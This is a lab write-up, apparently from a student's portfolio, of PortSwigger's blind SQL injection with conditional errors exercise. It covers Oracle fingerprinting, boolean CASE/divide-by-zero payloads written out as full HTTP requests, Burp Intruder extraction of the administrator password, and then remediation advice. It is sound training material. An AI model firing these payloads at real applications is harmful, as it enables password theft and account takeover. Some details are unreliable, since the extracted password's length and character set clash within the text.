# Blind SQL injection with conditional errors

**Category:** SQL Injection  
**Difficulty:** ⭐⭐⭐ (Practitioner)  
**Severity:** 🔴 Critical  
**OWASP Top 10:** A03:2021 – Injection

---

## Description

The application contains a blind SQL injection vulnerability in the `TrackingId` cookie parameter. The backend database is Oracle, and the application exhibits differential error behavior based on conditional query evaluation. An attacker can exploit this by injecting a `CASE` statement that triggers a divide-by-zero error when a condition is true, allowing binary inference of data through conditional errors. This enables extraction of sensitive information such as user passwords without any data being returned in the application response.

---

## Discovery Process

**Step 1 — Baseline Request**

A normal request to the `/filter?category=Gifts` endpoint was sent with the original `TrackingId` cookie value to establish baseline behavior.

> 📸 `screenshots/01-baseline-request.png`

**Step 2 — Single Quote Injection Test**

A single quote (`'`) was appended to the `TrackingId` cookie value. The server responded with an `HTTP 500 Internal Server Error`, indicating that the input was being concatenated directly into a SQL query and caused a syntax error.

> 📸 `screenshots/02-sqli-quote-test.png`

**Step 3 — Balanced Quotes Verification**

Two single quotes (`''`) were appended to balance the string delimiter. The server returned `HTTP 200 OK`, confirming that the injection point is within a string literal in the SQL query and that we have control over the query structure.

> 📸 `screenshots/03-balanced-quotes.png`

**Step 4 — Oracle Database Fingerprinting**

The payload `|| (SELECT '' from dual) ||` was injected. Because `dual` is an Oracle-specific dummy table, the `HTTP 200 OK` response confirmed the backend database is Oracle. The `||` operator is Oracle's string concatenation operator.

> 📸 `screenshots/04-oracle-dual-test.png`

**Step 5 — Conditional Error Technique Verification**

A `CASE` statement was injected to test the conditional error technique: `CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END`. When the condition evaluates to true, the division-by-zero should trigger a database error. Testing with true and false conditions confirmed that the application returns `HTTP 500` when the condition is true and `HTTP 200` when false, establishing a reliable boolean oracle.

> 📸 `screenshots/05-conditional-error-test.png`

**Step 6 — Targeting the Users Table**

Per the lab description, the target table is users and the target account is administrator. The conditional error payload was used to confirm that this user exists in the database: from users WHERE username='administrator'. The HTTP 500 response confirmed the user record exists and the query structure is valid.

> 📸 `screenshots/06-conditional-error-users-table.png`

---

## Exploitation

**Step 7 — Password Length Enumeration**

The password length was determined using binary search with the conditional error payload. Testing `LENGTH(password)>1` returned `HTTP 500` (true), while `LENGTH(password)>20` returned `HTTP 200` (false). Further refinement confirmed the administrator password is exactly 20 characters long.

**Request sent (length > 1):**

```http
GET /filter?category=Gifts HTTP/2
Host: 0a60005e044c6806816ee31c003b00e3.web-security-academy.net
Cookie: TrackingId=hCKH0cLvgUsl1mTy'|| (SELECT CASE WHEN(LENGTH(password)>1) THEN TO_CHAR(1/0) ELSE '' END from users WHERE username='administrator') ||'; session=5kqarys8lsvuqsxfxawwxlkvbjjp1l7b:
```

**Response received:**

```http
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2428
```

> 📸 `screenshots/07-password-length-enumeration.png`

**Request sent (length > 20):**

```http
GET /filter?category=Gifts HTTP/2
Host: 0a60005e044c6806816ee31c003b00e3.web-security-academy.net
Cookie: TrackingId=hCKH0cLvgUsl1mTy'|| (SELECT CASE WHEN(LENGTH(password)>20) THEN TO_CHAR(1/0) ELSE '' END from users WHERE username='administrator') ||'; session=5kqarys8lsvuqsxfxawwxlkvbjjp1l7b:
```

**Response received:**

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=pYbYek9klTrSkNBCN5vmd2uWjA8sPcGP; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 5438
```

> 📸 `screenshots/08-password-length-boundary.png`

**Step 8 — Character-by-Character Brute Force**

Burp Suite Intruder was configured with a Sniper attack to brute-force each character of the password. The payload position was set on the character guess in the `SUBSTR()` function:

```
TrackingId=hCKH0cLvgUsl1mTy'|| (SELECT CASE WHEN (SUBSTR(password,1,1)='§a§')THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') ||'
```

A simple list payload containing lowercase alphabetic characters was used. The attack sent 36 requests per character position.

> 📸 `screenshots/09-intruder-setup.png`

**Payload Configuration:**

The payload type was set to "Simple list" with lowercase alphabetic characters [a-z0-9] to test each possible character value.

> 📸 `screenshots/10-payload-configuration.png`

**Step 9 — Extracting the Password**

The Intruder results were analyzed by sorting on Status Code. Any payload causing an `HTTP 500` response indicated a correct character match (true condition triggering division by zero). The first character was identified as `'t'` (Request 5, Status 500, Length 2555), while all other characters returned `HTTP 200` (Length 5633).

> 📸 `screenshots/11-intruder-results.png`

This process was repeated for all 20 character positions. The complete extracted administrator password was: `t28p2nxul57wvyyinewsa`

**Step 10 — Password Verification**

The full password was verified in a single request using `SUBSTR(password,1,20)`:

**Request sent:**

```http
GET /filter?category=Gifts HTTP/2
Host: 0a60005e044c6806816ee31c003b00e3.web-security-academy.net
Cookie: TrackingId=hCKH0cLvgUsl1mTy'|| (SELECT CASE WHEN (SUBSTR(password,1,20)='t28p2nxul57wvyyinews')THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') ||'; session=5kqarys8lsvuqsxfxawwxlkvbjjp1l7b:
```

**Step 11 — Administrator Login**

The extracted password `t28p2nxul57wvyyinews` was used to log in as the `administrator` user through the application's login form.

> 📸 `screenshots/12-admin-login.png`

**Step 12 — Lab Solved**

Successful authentication as `administrator` completed the lab objective. The "Congratulations, you solved the lab!" confirmation was displayed.

> 📸 `screenshots/13-lab-solved.png`

---

## Impact

- **Complete Authentication Bypass** — An attacker can extract any user's password through boolean-based conditional error injection, leading to full account takeover without any prior access.
- **Sensitive Data Exfiltration** — The vulnerability allows extraction of all database contents, including usernames, passwords, and potentially other sensitive application data, one bit at a time.
- **No Error Output Required** — Because this is a blind injection, the application never returns SQL error messages to the user. The attack relies solely on HTTP status code differential analysis (500 vs 200), making it stealthy and difficult to detect through traditional output monitoring.
- **Lateral Movement** — With administrator access, an attacker can access administrative functionality, modify application configurations, access restricted data, or pivot to attack other users.

---

## Root Cause

The vulnerability exists because the application concatenates user-supplied input (the `TrackingId` cookie) directly into a SQL query without parameterization or proper sanitization. The Oracle database backend processes the injected `CASE` statement, and when the condition evaluates to true, the `TO_CHAR(1/0)` expression triggers a divide-by-zero exception that propagates to the HTTP layer as a 500 error.

**Vulnerable flow:**

```
Attacker modifies TrackingId cookie → Server concatenates value into SQL query → ❌ No parameterized query or input validation → Database evaluates injected CASE statement → Error bubbles up as HTTP 500
```

**Secure flow:**

```
Attacker modifies TrackingId cookie → Server treats value as a bound parameter → ✅ Prepared statement with parameterized query → Database safely handles input as data only → No SQL injection possible
```

---

## Remediation

- **Use Parameterized Queries (Prepared Statements)** — All database interactions must use parameterized queries where user input is passed as parameters rather than concatenated into the query string. This is the most effective defense against SQL injection.
- **Input Validation and Whitelisting** — Implement strict input validation on the `TrackingId` cookie. If the tracking ID is expected to be an alphanumeric string of a specific format, reject any input containing SQL metacharacters such as single quotes, `||`, `UNION`, `SELECT`, etc.
- **Least Privilege Database Accounts** — The application's database account should have the minimum necessary privileges. It should not have access to system tables like `dual` or the ability to read arbitrary tables like `users` if not required for application functionality.
- **Consistent Error Handling** — Implement global exception handling that returns generic error pages for all database errors. Never expose raw SQL error messages or stack traces to end users, as this aids attackers in refining their injection payloads.
- **Web Application Firewall (WAF) Rules** — Deploy WAF rules to detect and block common SQL injection patterns in cookies, headers, and query parameters, as a defense-in-depth measure.

---

## Tools Used

- Burp Suite Professional (Proxy, Repeater, and Intruder)
- Web Security Academy lab environment

---

## References

- [PortSwigger: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: Improper Neutralization of Special Elements in SQL Command](https://cwe.mitre.org/data/definitions/89.html)
